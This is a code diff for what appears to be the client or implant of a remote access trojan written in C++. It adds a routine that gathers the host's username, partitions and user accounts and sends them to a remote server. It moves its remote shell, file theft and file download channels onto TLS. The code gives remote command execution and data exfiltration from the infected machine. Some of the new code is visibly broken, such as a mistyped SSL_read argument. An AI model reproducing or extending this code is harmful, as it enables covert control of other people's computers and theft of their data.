@@ -1,6 +1,63 @@
 #include "Client.hpp"
 #include "Commands.hpp"
 #include "Misc.hpp"
+#include "Info.hpp"
+
+bool Client::SendInfo(){
+        #ifdef _DEBUG
+        std::cout<<"Sending info\n";
+        #endif
+        bool bFlag = true;
+        std::string strFinal = "";
+        std::vector<struct sPartition> vcVec;
+        std::vector<struct sUsers> vcVec2;
+        char *cMem = nullptr, *cCpu = nullptr, *cCores = nullptr, *cUsername = nullptr;
+        Uname(cMem);
+        Cpu(cCpu, cCores);
+        if(UserName(cUsername) == 0){
+                strFinal.append(cUsername);
+        } else {
+                strFinal.append("siseneg");
+        }       
+        strFinal.append(1, '|');
+        Partitions(vcVec);
+        Users(vcVec2);
+        for(int iIt = 0; iIt<int(vcVec.size()); iIt++){
+                strFinal.append(vcVec[iIt].cPartition);
+                strFinal.append(1, ':');
+                strFinal.append(std::to_string(vcVec[iIt].dParitionSize));
+                strFinal.append(1, '*');
+        }
+                strFinal.append(1, '|');
+        for(int iIt2 = 0; iIt2<int(vcVec2.size()); iIt2++){
+                //std::cout<<vcVec2[iIt2].cUsername<<'\t'<<vcVec2[iIt2].cShell<<'\n';
+                strFinal.append(vcVec2[iIt2].cUsername);
+                strFinal.append(1, ':');
+                strFinal.append(vcVec2[iIt2].cShell);
+                strFinal.append(1, '*');
+        }
+        strFinal.append("|AAA");
+        #ifdef _DEBUG
+        std::cout<<"packet\n"<<strFinal<<'\n';
+        #endif
+        int iLen = strFinal.length();
+        if(SSL_write(sslSocket, strFinal.c_str(), iLen) <= 0){
+                #ifdef _DEBUG
+                std::cout<<"Unable to send data to server\n";
+                error();
+                #endif
+                bFlag = false;
+        }
+        delete[] cUsername;
+        cUsername = nullptr;
+        delete[] cMem;
+	cMem = nullptr;
+        delete[] cCpu;
+        cCpu = nullptr;
+        delete[] cCores;
+        cCores = nullptr;
+        return bFlag;
+}
 
 void Client::threadReadShell(int& Pipe){
 	fcntl(Pipe, F_SETFL, O_NONBLOCK); //make fd non-block so stop when program exits
@@ -15,10 +72,8 @@ void Client::threadReadShell(int& Pipe){
 			continue;
 		}
 		cCmdOutput[iRet] = '\0';
-		strCmd = cCmdOutput;
-		strCmdOutput = ShellXor(strCmd, strPassword);
-		iLen = strCmdOutput.length();
-		iRet = send(sckSocket, strCmdOutput.c_str(), iLen, 0);
+		iLen = strlen(cCmdOutput);
+		iRet = SSL_write(sslSocket, cCmdOutput, iLen);
 		#ifdef _DEBUG
 		std::cout<<"Sent "<<iRet<<" bytes\n";
 		#endif
@@ -42,7 +97,7 @@ void Client::SpawnShell(const std::string strCommand){
 		std::cout<<"pipe error\n";
 		error();
 		#endif
-		if(ssSendBinary(CommandCodes::cShellError) <= 0){
+		if(SSL_write(sslSocket, CommandCodes::cShellError, 3) <= 0){
 			#ifdef _DEBUG
 			std::cout<<"Unable to send command to server\n";
 			error();
@@ -57,7 +112,7 @@ void Client::SpawnShell(const std::string strCommand){
 		#endif
 		close(InPipeFD[0]);
 		close(InPipeFD[1]);
-		if(ssSendBinary(CommandCodes::cShellError) <= 0){
+		if(SSL_write(sslSocket, CommandCodes::cShellError, 3) <= 0){
 			#ifdef _DEBUG
 			std::cout<<"Unable to send command to server\n";
 			error();
@@ -67,7 +122,7 @@ void Client::SpawnShell(const std::string strCommand){
 	}
 	pid_t pP = fork();
 	if(pP == 0){ //child running
-		if(ssSendBinary(CommandCodes::cShellRunning) <= 0){
+		if(SSL_write(sslSocket, CommandCodes::cShellRunning, 3) <= 0){
 			#ifdef _DEBUG
 			std::cout<<"Unable to send command to server\n";
 			error();
@@ -98,9 +153,9 @@ void Client::SpawnShell(const std::string strCommand){
 		//here read from socket and write to pipe
 		std::string strCmdBuffer = "";
 		char cCmdBuffer[512];
-		int iBytes = 0;
+		int iBytes = 0, iLen = 0;
 		while(isRunningShell){
-			iBytes = recv(sckSocket, cCmdBuffer, 512, 0);
+			iBytes = SSL_read(sslSocketm cCmdBuffer, 511);
 			if(iBytes <= 0){
 				isRunningShell = false;
 				#ifdef _DEBUG
@@ -110,11 +165,8 @@ void Client::SpawnShell(const std::string strCommand){
 				break;
 			}
 			cCmdBuffer[iBytes] = '\0';
-			strCmdBuffer = ShellXor(std::string(cCmdBuffer), std::string("password"));
-			#ifdef _DEBUG
-			std::cout<<"Command "<<strCmdBuffer<<'\n';
-			#endif
-			write(InPipeFD[1], strCmdBuffer.c_str(), strCmdBuffer.length());
+			iLen = strlen(cCmdBuffer);
+			write(InPipeFD[1], cCmdBuffer, iLen);
 			if(strcmp(strCmdBuffer.c_str(), "exit\n") == 0){
 				#ifdef _DEBUG
 				std::cout<<"\nbye\n";
@@ -124,7 +176,7 @@ void Client::SpawnShell(const std::string strCommand){
 			}
 		}
 		t1.join();
-		if(ssSendBinary(CommandCodes::cShellEnd) <= 0){
+		if(SSL_write(sslSocket, CommandCodes::cShellEnd, 3) <= 0){
 			#ifdef _DEBUG
 			std::cout<<"Unable to send command to server\n";
 			error();
@@ -135,7 +187,7 @@ void Client::SpawnShell(const std::string strCommand){
 		std::cout<<"fork failed\n";
 		error();
 		#endif
-		if(ssSendBinary(CommandCodes::cShellError) <= 0){
+		if(SSL_write(sslSocket, CommandCodes::cShellError, 3) <= 0){
 			#ifdef _DEBUG
 			std::cout<<"Unable to send command to server\n";
 			error();
@@ -154,17 +206,26 @@ bool Client::SendFile(const std::string strLocalFile) {
 		std::cout<<"Unable to open file\n";
 		error();
 		#endif
-		ssSendBinary(CommandCodes::cFileError);
+		if(SSL_write(sslSocket, CommandCodes::cFileError, 3) <= 0){
+			#ifdef _DEBUG
+			std::cout<<"Unable to send packet\n";
+			#endif
+		}
 		return false;
 	}
 	u_int iBlockSize = 255;
+	int iLen = 0;
 	u64 uFileSize = Misc::GetFileSize(strLocalFile);
 	u64 uBytesSent = 0;
 	if(uFileSize == 0){
 		#ifdef _DEBUG
 		std::cout<<"File size is 0\n";
 		#endif
-		ssSendBinary(CommandCodes::cFileError);
+		if(SSL_write(sslSocket, CommandCodes::cFileError, 3) <= 0){
+			#ifdef _DEBUG
+			std::cout<<"Unable to send packet\n";
+			#endif
+		}
 		strmInputFile.close();
 		return false;
 	}
@@ -173,7 +234,8 @@ bool Client::SendFile(const std::string strLocalFile) {
 	#ifdef _DEBUG
 	std::cout<<"File size is "<<uFileSize<<'\n';
 	#endif
-	if(ssSendBinary(strCmdLine.c_str()) > 0){
+	iLen = strCmdLine.length();
+	if(SSL_write(sslSocket, strCmdLine.c_str(), iLen) > 0){
 		sleep(1);
 		char *cFileBuffer = nullptr;
 		int iTmp = 0;
@@ -234,7 +296,7 @@ void Client::RetrieveFile(u64 uFileSize, c_char cExec,const std::string strLocal
 			std::cout<<"Unable to open dummy file?\n";
 			error();
 			#endif
-			if(ssSendBinary(CommandCodes::cFileTransferCancel) <= 0){
+			if(SSL_write(sslSocket, CommandCodes::cFileTransferCancel, 3) <= 0){
 				#ifdef _DEBUG
 				std::cout<<"Unable to send canel command\n";
 				error();
@@ -243,7 +305,7 @@ void Client::RetrieveFile(u64 uFileSize, c_char cExec,const std::string strLocal
 			return;
 		}
 	}
-	if(ssSendBinary(CommandCodes::cFileTranferBegin) <= 0){
+	if(SSL_write(sslSocket, CommandCodes::cFileTranferBegin, 3) <= 0){
 		#ifdef _DEBUG
 		std::cout<<"Unable to send confirmation to server\n";
 		error();
@@ -347,6 +409,19 @@ bool Client::Connect(c_char* cIP, c_char* cPORT){
 	memset(&strctAd, 0, sizeof(strctAd));
 	strctAd.ai_family = AF_UNSPEC;
 	strctAd.ai_socktype = SOCK_STREAM;
+	if(sslCTX){
+		SSL_CTX_free(sslCTX);
+	}
+	if(sslSocket){
+		SSL_free(sslSocket);
+	}
+	sslCTX = SSL_CTX_new(TLS_client_method());
+	if(sslCTX == nullptr){
+		#ifdef _DEBUG
+		ERR_print_errors_fp(stderr);
+		#endif
+		return false;
+	}
 	int iRet;
 	if((iRet = getaddrinfo(cIP, cPORT, &strctAd, &strctServer)) != 0){
 		#ifdef _DEBUG
@@ -379,63 +454,20 @@ bool Client::Connect(c_char* cIP, c_char* cPORT){
 		freeaddrinfo(strctServer);
 		return false;
 	}
+	sslSocket = SSL_new(sslCTX);
+	SSL_set_fd(sslSocket, sckSocket);
+	if(SSL_connect(sslSocket) == -1){
+		freeaddrinfo(strctServer);
+		#ifdef _DEBUG
+		std::cout<<"Unable to stablish SSL connection\n";
+		ERR_print_errors_fp(stderr);
+		#endif
+		return false;
+	}
 	freeaddrinfo(strctServer);
 	return true;
 }
 
 void Client::CloseConnection(){
 	close(sckSocket);
-}
-
-int Client::ssSendStr(const std::string& strMessage){
-	std::string strTmp = strCipher(strMessage);
-	int sBytes = strTmp.length();
-	int iBytes = send(sckSocket, strTmp.c_str(), sBytes, 0);
-	return iBytes;
-}
-
-int Client::ssRecvStr(std::string& strOutput, int sBytes){
-	char *tmpData = new char[sBytes+1];
-	int iBytes = recv(sckSocket, tmpData, sBytes, 0);
-	if(iBytes <= 0){
-		return -1;
-	}
-	strOutput = strUnCipher(std::string(tmpData));
-	delete[] tmpData;
-	tmpData = nullptr;
-	return iBytes;
-}
-
-int Client::ssSendBinary(const char *cData){
-	char *tmpData = nullptr;
-	int sBytes = BinaryCipher(cData, tmpData);
-	int iBytes = send(sckSocket, tmpData, sBytes, 0);
-	#ifdef _DEBUG_CONNECTION
-	std::cout<<"> "<<cData<<'\n';
-	#endif
-	delete[] tmpData;
-	tmpData = nullptr;
-	return iBytes;
-}
-	
-//delete memory of cOutput after use
-int Client::ssRecvBinary(char*& cOutput, int sBytes){
-	char *cBuffer = new char[sBytes];
-	if(cBuffer == nullptr){
-		return -1;
-	}
-	int iBytes = recv(sckSocket, cBuffer, sBytes, 0);
-	if(iBytes <=0){
-		delete[] cBuffer;
-		cBuffer = nullptr;
-		return -1;
-	}
-	cOutput = BinaryUnCipher((const char *)cBuffer);
-	#ifdef _DEBUG_CONNECTION
-	std::cout<<"< "<<cOutput<<'\n';
-	//std::cout<<"Ciphered<<"<<cBuffer<<'\n';
-	#endif
-	delete[] cBuffer;
-	cBuffer = nullptr;
-	return iBytes;
 }
